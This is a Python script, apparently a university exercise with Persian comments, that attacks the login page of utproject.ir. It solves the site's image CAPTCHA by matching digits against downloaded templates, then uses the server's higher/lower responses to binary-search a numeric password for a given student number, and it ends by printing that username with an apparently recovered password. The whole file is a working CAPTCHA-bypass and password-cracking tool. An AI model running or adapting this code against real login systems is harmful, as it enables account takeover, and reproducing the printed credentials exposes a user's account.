#from PIL import Image
#from io import BytesIO
#import json
#import requests
#from requests.sessions import Session


def Project():
    def download_numbers():
        #adad ha ro dar ye list mirizim
        ses=Session()
        nums=[None]*10
        for i in range(10):
            nums[i]=Image.open(BytesIO(ses.get(f'http://utproject.ir/bp/Numbers/{i}.jpg').content)).convert('L').load()
        return(nums)

    def check_match(k,pic):
        #do ta ax ro moghayese mikone va tedad pixel hayi ke yeki hast ro return mikone.
        acc=0
        for i in range(40):
            for j in range(40):
                if pic[j][i]==nums[k][i,j]:
                    acc+=1
        return(acc)

    def get_number(pic):
        #axi ke darim ro ba ax haye 0 ta 9 moghayese mikone, harkodum tedade pixele moshtarakesh shod 1600 ta adade morede nazare.
        acc=[None]*10
        for i in range(len(nums)):
            acc[i]=check_match(i,pic)
        return(acc.index(1600))

    def captcha_to_number(captcha):
        #code pixel haye adadaye captchayi ke az site gereftim ro mirizim tuye ml va numbere motanazer bahash ro be dast miarim.
        number=[None]*5
        x=captcha.load()
        ml=[[[x[40*k+i,j]for i in range(0,40)]for j in range(40)]for k in range(5)]
        for ind,pic in enumerate(ml):
            number[ind]=get_number(pic)
        return(number)

    nums=download_numbers()

    def get_stat(ses,password):
        #captchayi ke hack kardim va passwordi ke darim ro post mikonim va stat ro migirim
        img_in_txt=ses.get("http://utproject.ir/bp/image.php")
        img=BytesIO(img_in_txt.content)
        captcha=Image.open(img).convert('L')
        cap=''.join(map(str,captcha_to_number(captcha)))
        resp=ses.post("http://utproject.ir/bp/login.php",data={"username":f'{SN}',"password":f'{password}',"captcha":cap})
        res=json.loads(resp.text)
        return(res['stat'])

    def hack(sn):
        #baraye peyda kardane password az binary search estefade mikonim. va bar tebghe stati ke mide end o begin ro avaz mikonim.
        ses=Session()
        begin,end=0,10**20
        while begin<end:
            mid=(end+begin)//2
            stat=get_stat(ses,mid)
            if stat==0:
                return(mid)
            elif stat==1:
                end=mid
            elif stat==-1:
                begin=mid+1

    SN=610300022
    print(hack(SN))


username=610300022
password=19166287669521964895

print(username)
print(password)
